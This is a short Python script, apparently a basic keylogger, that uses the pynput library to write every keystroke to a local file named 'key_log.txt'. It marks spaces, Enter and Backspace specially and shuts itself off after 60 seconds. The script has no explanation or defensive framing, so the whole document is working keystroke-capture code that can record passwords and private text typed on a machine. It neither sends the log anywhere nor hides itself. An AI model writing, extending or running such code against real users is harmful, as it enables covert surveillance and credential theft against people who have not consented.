from pynput.keyboard import Key, Listener
import threading

log_file = "key_log.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        key_data = str(key).replace("'", "")
        if key == Key.space:
            f.write(" ")
        elif key == Key.enter:
            f.write("\n")
        elif key == Key.backspace:
            f.write("<Backspace>")
        else:
            f.write(key_data)

def on_press(key):
    write_to_file(key)

def stop_keylogger():
    listener.stop()

timer = threading.Timer(60, stop_keylogger)
timer.start()

with Listener(on_press=on_press) as listener:
    listener.join()

